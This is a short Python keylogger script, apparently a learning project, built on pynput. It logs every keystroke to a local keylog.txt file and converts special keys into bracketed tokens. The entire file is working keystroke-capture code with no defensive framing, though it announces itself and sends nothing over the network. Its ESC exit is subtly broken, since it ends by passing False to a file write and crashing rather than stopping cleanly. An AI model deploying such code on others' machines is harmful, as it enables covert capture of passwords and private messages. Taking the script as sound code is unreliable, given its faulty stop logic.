from pynput.keyboard import Key, Listener
# import after installing pynput, used to impord keyboard input

log_file = "keylog.txt" # log the inputs in the file

def on_press(key): # uses the write_to_file function to write in the keylog file, will be called everytime a key is pressed
    write_to_file(key)

def write_to_file(key):
    try:
        key_str = str(key.char)  # For character keys
    except AttributeError:
        key_str = special_keys(key)  # For special keys like space, enter, etc

    with open(log_file, 'a') as f:
        f.write(key_str)

def special_keys(key):
    if key == Key.space:
        return ' '
    elif key == Key.enter:
        return '\n'
    elif key == Key.backspace:
        return '[BACKSPACE]'
    elif key == Key.tab:
        return '\t'
    elif key == Key.esc:
        print("ESC pressed, exiting keylogger.")
        return False  # the keylogger stops
    else:
        return f'[{key}]' # convert special the key into a string and places it in between brackets

def start_keylogger():
    print("Starting keylogger. Press ESC to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()